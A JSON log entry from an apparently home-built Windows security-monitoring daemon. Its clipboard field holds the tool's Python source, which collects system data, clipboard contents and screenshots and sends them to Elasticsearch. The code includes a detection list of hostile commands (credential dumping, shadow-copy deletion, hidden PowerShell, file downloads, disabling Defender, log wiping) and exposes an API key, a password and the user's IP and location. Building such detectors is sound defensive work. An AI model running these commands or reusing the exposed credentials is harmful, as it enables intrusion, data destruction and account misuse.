session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash)  # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n\r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log  # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str):  # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(),\r\n                                # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath  # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it exists from a previous run\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        log_daemon_message(\"INFO\", \"Found existing 'stop_snakey.txt'. Removing it to start cleanly.\")\r\n        try:\r\n            os.remove(stop_file_path)\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove existing stop file: {e}\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            log_daemon_message(\"INFO\", \"Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()  # This now handles saving encrypted logs and updating ledger\r\n\r\n        # Send the (original, unencrypted) session_log to Wazuh and Elasticsearch\r\n        # These systems need the clear-text data for analysis and display\r\n        log_to_wazuh_file(session_log)\r\n        send_to_elasticsearch(session_log)\r\n\r\n        log_daemon_message(\"INFO\", f\"Sleeping for 15 seconds before next collection at {datetime.now().isoformat()}...\")\r\n        time.sleep(3)\r\n\r\n    # Final cleanup of stop file\r\n    if os.path.exists(stop_file_path):\r\n        try:\r\n            os.remove(stop_file_path)\r\n            log_daemon_message(\"INFO\", \"Stop file removed on graceful exit.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to remove stop file during exit: {e}\")", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: PT", "Access from known VPN/proxy IP: 89.214.145.78", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'format c:')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'del /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (795 items)", "AppData": "Found (55 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "fa7e5b21da57914f38389845b114538f80d2abe45c8e88b17ceb214da1099591", "screenshot_hash": "694191c949055c00bcfb71ef0e59da67496628d0292a5013a4dd8828a45eafda", "_raw_log_hash": "b7b4b910cf4ed1614db17731b47d706795ac06fd699bbacfdc317c7b6ea0ff10"}
{"timestamp": "2025-06-11T16:55:42.188066+00:00", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "89.214.145.78", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta, timezone\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\nimport traceback # Added for detailed error logging\r\n\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"  # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === New: Country Change and VPN/Proxy IP Detection Configuration ===\r\nlast_country_path = os.path.join(base_path, \"last_country.txt\") # Path to store last country\r\nKNOWN_VPN_IPS = {\"89.214.145.78\", \"123.45.67.89\"}  # Example IPs - Expand this list as needed!\r\n\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",  # Formatting drives\r\n    \"del /s /q\",  # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",  # Force remove directory (subdirectories, quiet)\r\n    \"net user\",  # User management (info or creation)\r\n    \"net localgroup administrators\",  # Admin group checks\r\n    \"taskkill /f /im\",  # Force kill process by image name\r\n    \"schtasks /create\",  # Create scheduled tasks (persistence)\r\n    \"reg delete\",  # Delete registry keys\r\n    \"mimikatz\",  # Credential dumping tool\r\n    \"certutil -urlcache -f -split\",  # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",  # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\",  # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",  # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\",  # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\",  # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",  # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",  # Download files via BITS\r\n    \"wevtutil cl system\",  # Clear event logs\r\n    \"cipher /w\",  # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",  # Secure delete tool\r\n]\r\n\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip())  # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip())  # Still print even if file write fails\r\n\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    # Use verify=False here as well, consistent with Elasticsearch client config\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n                            verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    # Read a byte to force connection establishment, then close to prevent hanging\r\n    try:\r\n        response.raw.read(1)\r\n    except Exception as read_e:\r\n        log_daemon_message(\"WARNING\", f\"Error reading from raw response during pre-check (might be expected for empty response): {read_e}\")\r\n    response.close()\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\",\r\n                       f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\n    traceback.print_exc() # <-- Added traceback\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n    traceback.print_exc() # <-- Added traceback\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,  # This disables SSL certificate verification\r\n            ssl_show_warn=False, # Suppress SSL warnings in logs from elasticsearch client\r\n            request_timeout=30 # Increased timeout for client initialization\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster. Check credentials.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD carefully.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\",\r\n                           f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        traceback.print_exc() # <-- Added traceback\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])  # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash:  # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\",\r\n                               f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = []  # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\",\r\n                               f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n            traceback.print_exc()\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n            traceback.print_exc()\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\",\r\n                               f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n            traceback.print_exc() # <-- Added traceback\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n            traceback.print_exc() # <-- Added traceback\r\n    else:\r\n        log_daemon_message(\"WARNING\",\r\n                           \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === New: Check Country Change Function ===\r\ndef check_country_change(current_country, alerts_list):\r\n    \"\"\"\r\n    Checks if the country has changed since the last recorded session.\r\n    Stores the current country for future comparison.\r\n    \"\"\"\r\n    try:\r\n        if os.path.exists(last_country_path):\r\n            with open(last_country_path, \"r\") as f:\r\n                last_country = f.read().strip()\r\n            if last_country and last_country != current_country:\r\n                alerts_list.append(f\"Country changed since last session: {last_country} -> {current_country}\")\r\n                log_daemon_message(\"ALERT\", f\"Country changed: {last_country} -> {current_country}\")\r\n        # Update the file for next session, even if it's the first run or country didn't change\r\n        with open(last_country_path, \"w\") as f:\r\n            f.write(current_country)\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Failed to check/update last country: {e}\")\r\n    return alerts_list\r\n\r\n# === New: Check VPN/Proxy IP Function ===\r\ndef check_vpn_proxy_ip(current_ip, alerts_list):\r\n    \"\"\"\r\n    Checks if the current public IP is in a list of known VPN/proxy IPs.\r\n    \"\"\"\r\n    if current_ip in KNOWN_VPN_IPS:\r\n        alerts_list.append(f\"Access from known VPN/proxy IP: {current_ip}\")\r\n        log_daemon_message(\"ALERT\", f\"Access from known VPN/proxy IP detected: {current_ip}\")\r\n    return alerts_list\r\n\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now(timezone.utc)  # consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(),  # consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],  # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        # Public IP and ISP lookup (includes country check and new VPN/Proxy IP check)\r\n        current_public_ip = None\r\n        current_country = None\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            current_public_ip = ip_info.get(\"ip\") # Store for VPN check\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            current_country = ip_info.get(\"country\") # Store for country change check\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n                log_daemon_message(\"ALERT\", f\"Access from untrusted country: {ip_info['country']}\")\r\n\r\n            # NEW: Check for country change\r\n            if current_country:\r\n                session_log[\"alerts\"] = check_country_change(current_country, session_log[\"alerts\"])\r\n\r\n            # NEW: Check for known VPN/proxy IP\r\n            if current_public_ip:\r\n                session_log[\"alerts\"] = check_vpn_proxy_ip(current_public_ip, session_log[\"alerts\"])\r\n\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError:  # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            session_log[\"alerts\"] = analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], 